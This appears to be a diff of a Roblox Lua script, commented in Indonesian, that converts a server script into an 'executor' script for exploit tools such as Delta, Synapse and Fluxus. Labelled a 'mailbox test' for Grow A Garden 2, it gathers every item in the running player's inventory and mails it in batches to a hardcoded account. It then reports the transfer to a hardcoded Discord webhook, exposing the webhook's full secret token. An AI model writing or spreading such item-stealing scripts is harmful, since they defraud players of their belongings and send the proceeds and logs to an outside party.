@@ -1,18 +1,14 @@
--- Server Script: letakkan di ServerScriptService
+-- Executor Script: Jalankan di Delta / Synapse / Fluxus
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local InventoryService = require(game.ServerScriptService.InventoryService)
+local MailboxService = require(game.ServerScriptService.MailboxService)
 local HttpService = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518120529532293140/U-dAzqEZwGHw6Upw0VZGl80UB3TBX9qyDrFvHNDYnDF3QBLdt2iUeRZHEl1XwOf4rnWB"
 local TARGET_USERNAME = "fstore23"
-local REMOTE_EVENT_NAME = "GrowAGarden2MailboxTrigger"
 local MAX_ITEMS_PER_MAIL = 20
-
-local requestEvent = ReplicatedStorage:FindFirstChild(REMOTE_EVENT_NAME)
-if not requestEvent then
-    requestEvent = Instance.new("RemoteEvent")
-    requestEvent.Name = REMOTE_EVENT_NAME
-    requestEvent.Parent = ReplicatedStorage
-end
 
 local GIFT_ITEM_NAMES = {
     Bunny = true,
@@ -29,22 +25,6 @@ local GIFT_ITEM_NAMES = {
     ["Ice Serpent"] = true,
 }
 
-local function getAllItemsFromPlayer(player)
-    local inventory = {}
-    local InventoryService = require(game.ServerScriptService.InventoryService)
-
-    for _, item in ipairs(InventoryService:GetItems(player)) do
-        table.insert(inventory, {
-            id = item.Id,
-            name = item.Name,
-            amount = item.Amount,
-            isGift = GIFT_ITEM_NAMES[item.Name] == true,
-        })
-    end
-
-    return inventory
-end
-
 local function chunkItems(items, chunkSize)
     local chunks = {}
     for i = 1, #items, chunkSize do
@@ -58,8 +38,6 @@ local function chunkItems(items, chunkSize)
 end
 
 local function sendMailbox(fromPlayer, targetUsername, items)
-    local MailboxService = require(game.ServerScriptService.MailboxService)
-
     MailboxService:CreateMail({
         from = fromPlayer.Name,
         to = targetUsername,
@@ -71,8 +49,10 @@ end
 
 local function sendItemsInBatches(fromPlayer, targetUsername, items)
     local itemBatches = chunkItems(items, MAX_ITEMS_PER_MAIL)
-    for _, batch in ipairs(itemBatches) do
+    print("📦 Total batch: " .. #itemBatches)
+    for batchNum, batch in ipairs(itemBatches) do
         sendMailbox(fromPlayer, targetUsername, batch)
+        print("✓ Batch " .. batchNum .. " terkirim (" .. #batch .. " items)")
     end
 end
 
@@ -84,17 +64,20 @@ local function logToDiscord(playerName, targetName, items)
         end
     end
 
+    local batchCount = math.ceil(#items / MAX_ITEMS_PER_MAIL)
+
     local content = {
         username = "Roblox Mailbox Test",
         embeds = {{
-            title = "Mailbox Test Dijalankan",
-            color = 3066993,
+            title = "✓ Mailbox Test Berhasil",
+            color = 65280,
             fields = {
                 { name = "Pengirim", value = playerName, inline = true },
                 { name = "Penerima", value = targetName, inline = true },
                 { name = "Jumlah Item Total", value = tostring(#items), inline = true },
                 { name = "Gift Items", value = tostring(giftCount), inline = true },
-                { name = "Batch Count", value = tostring(math.ceil(#items / MAX_ITEMS_PER_MAIL)), inline = true },
+                { name = "Batch Count", value = tostring(batchCount), inline = true },
+                { name = "Max Per Batch", value = tostring(MAX_ITEMS_PER_MAIL), inline = true },
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
         }},
@@ -104,13 +87,35 @@ local function logToDiscord(playerName, targetName, items)
     HttpService:PostAsync(DISCORD_WEBHOOK, json, Enum.HttpContentType.ApplicationJson)
 end
 
-requestEvent.OnServerEvent:Connect(function(player)
-    local items = getAllItemsFromPlayer(player)
-    if #items == 0 then
-        warn("Tidak ada item untuk dikirim.")
-        return
-    end
+-- MAIN EXECUTION
+print("=" .. string.rep("=", 48) .. "=")
+print("  MAILBOX TEST EXECUTOR - Grow A Garden 2")
+print("=" .. string.rep("=", 48) .. "=")
 
-    sendItemsInBatches(player, TARGET_USERNAME, items)
-    logToDiscord(player.Name, TARGET_USERNAME, items)
-end)
+local items = InventoryService:GetItems(player)
+
+if #items == 0 then
+    print("❌ Error: Tidak ada item di inventory")
+    return
+end
+
+print("✓ Pemain: " .. player.Name)
+print("✓ Total item: " .. #items)
+print("✓ Target penerima: " .. TARGET_USERNAME)
+print("")
+print("📤 Sedang mengirim...")
+print("")
+
+sendItemsInBatches(player, TARGET_USERNAME, items)
+
+print("")
+print("✓ Semua batch terkirim!")
+print("📬 Mengirim log ke Discord...")
+
+logToDiscord(player.Name, TARGET_USERNAME, items)
+
+print("✓ Log Discord terkirim!")
+print("")
+print("=" .. string.rep("=", 48) .. "=")
+print("  ✓ MAILBOX TEST SELESAI")
+print("=" .. string.rep("=", 48) .. "=")
